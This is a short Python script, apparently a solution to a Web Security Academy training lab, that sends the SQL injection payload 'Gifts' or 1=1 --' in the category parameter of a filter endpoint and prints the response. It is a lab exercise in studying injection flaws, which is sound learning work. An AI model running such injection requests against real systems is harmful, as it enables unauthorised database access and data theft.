import requests

def sql_injection_lab01(url, payload):
    #parameters
    params = {
        'category': payload
    }

    try:
        # Send the request
        response = requests.get(url, params=params, timeout=10)
        
        # Check if the request was successful
        response.raise_for_status()
        
        # Return the response text
        return response.text
    
    # http errs
    except requests.exceptions.HTTPError as http_err:
        return f"HTTP error occurred: {http_err}"
    # cnx err
    except requests.exceptions.ConnectionError as conn_err:
        return f"Connection error occurred: {conn_err}"
    # server takes too long to respond.
    except requests.exceptions.Timeout as timeout_err:
        return f"Timeout error occurred: {timeout_err}"
    #
    except requests.exceptions.RequestException as req_err:
        return f"An error occurred: {req_err}"


#
url = "https://0a6600ea046c8e968041b2b90048008d.web-security-academy.net/filter"
payload = "Gifts' or 1=1 --"

response_text = sql_injection_lab01(url, payload)

print(response_text)
